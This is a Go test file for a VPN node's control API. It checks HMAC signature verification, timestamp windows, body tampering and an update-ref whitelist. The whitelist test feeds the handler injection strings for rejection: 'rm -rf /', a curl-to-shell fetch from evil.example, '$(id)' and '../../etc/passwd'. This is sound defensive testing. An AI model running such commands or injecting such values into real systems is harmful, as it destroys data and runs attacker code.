package control

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
	"time"
)

// signLikePanel reproduces exactly what the MosVPN panel sends, so this test
// fails if either side of the contract drifts.
func signLikePanel(secret, path, body string, ts int64) *http.Request {
	sum := sha256.Sum256([]byte(body))
	stringToSign := strconv.FormatInt(ts, 10) + "\nPOST\n" + path + "\n" + hex.EncodeToString(sum[:])
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(stringToSign))

	req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(body))
	req.Header.Set("X-Mosvpn-Timestamp", strconv.FormatInt(ts, 10))
	req.Header.Set("X-Mosvpn-Node", "125")
	req.Header.Set("X-Mosvpn-Signature", hex.EncodeToString(mac.Sum(nil)))
	return req
}

func testHandler() *handler {
	return &handler{
		secrets:   map[int]string{125: "node-secret"},
		version:   "v1.2.3",
		startedAt: time.Now().Add(-time.Minute),
	}
}

func TestPingAcceptsAPanelSignedRequest(t *testing.T) {
	h := testHandler()
	rec := httptest.NewRecorder()
	h.serve(rec, signLikePanel("node-secret", "/v2node/control/ping", "{}", time.Now().Unix()))

	if rec.Code != http.StatusOK {
		t.Fatalf("want 200, got %d (%s)", rec.Code, rec.Body.String())
	}
	var out struct {
		Status  string `json:"status"`
		Version string `json:"version"`
		NodeID  int    `json:"node_id"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if out.Status != "ok" || out.Version != "v1.2.3" || out.NodeID != 125 {
		t.Fatalf("unexpected body: %s", rec.Body.String())
	}
}

func TestRejectsWrongSecretStaleStampAndUnknownNode(t *testing.T) {
	cases := []struct {
		name string
		req  *http.Request
	}{
		{"wrong secret", signLikePanel("not-the-secret", "/v2node/control/ping", "{}", time.Now().Unix())},
		{"stale timestamp", signLikePanel("node-secret", "/v2node/control/ping", "{}", time.Now().Add(-2*time.Minute).Unix())},
		{"future timestamp", signLikePanel("node-secret", "/v2node/control/ping", "{}", time.Now().Add(2*time.Minute).Unix())},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rec := httptest.NewRecorder()
			testHandler().serve(rec, tc.req)
			if rec.Code != http.StatusUnauthorized {
				t.Fatalf("want 401, got %d (%s)", rec.Code, rec.Body.String())
			}
		})
	}

	// A signature that is valid for another node id must not pass as this one.
	req := signLikePanel("node-secret", "/v2node/control/ping", "{}", time.Now().Unix())
	req.Header.Set("X-Mosvpn-Node", "999")
	rec := httptest.NewRecorder()
	testHandler().serve(rec, req)
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("unknown node: want 401, got %d", rec.Code)
	}
}

func TestBodyIsCoveredBySignature(t *testing.T) {
	// Sign one body, send another: the sha256 in the string-to-sign changes, so
	// a tampered payload must be rejected.
	req := signLikePanel("node-secret", "/v2node/control/reconfig", `{"api_key":"good"}`, time.Now().Unix())
	req.Body = http.NoBody
	req = httptest.NewRequest(http.MethodPost, "/v2node/control/reconfig", strings.NewReader(`{"api_key":"evil"}`))
	signed := signLikePanel("node-secret", "/v2node/control/reconfig", `{"api_key":"good"}`, time.Now().Unix())
	req.Header = signed.Header

	rec := httptest.NewRecorder()
	testHandler().serve(rec, req)
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("tampered body: want 401, got %d (%s)", rec.Code, rec.Body.String())
	}
}

func TestUpdateRefIsWhitelisted(t *testing.T) {
	for _, ref := range []string{
		"latest; rm -rf /",
		"v1.0.0 && curl http://evil.example/x.sh | sh",
		"$(id)",
		"v1.2",
		"../../etc/passwd",
	} {
		body, _ := json.Marshal(map[string]string{"ref": ref})
		rec := httptest.NewRecorder()
		testHandler().serve(rec, signLikePanel("node-secret", "/v2node/control/update", string(body), time.Now().Unix()))
		if rec.Code != http.StatusBadRequest {
			t.Fatalf("ref %q: want 400, got %d (%s)", ref, rec.Code, rec.Body.String())
		}
	}

	if !refPattern.MatchString("latest") || !refPattern.MatchString("v0.4.5") {
		t.Fatal("valid refs must pass the whitelist")
	}
}
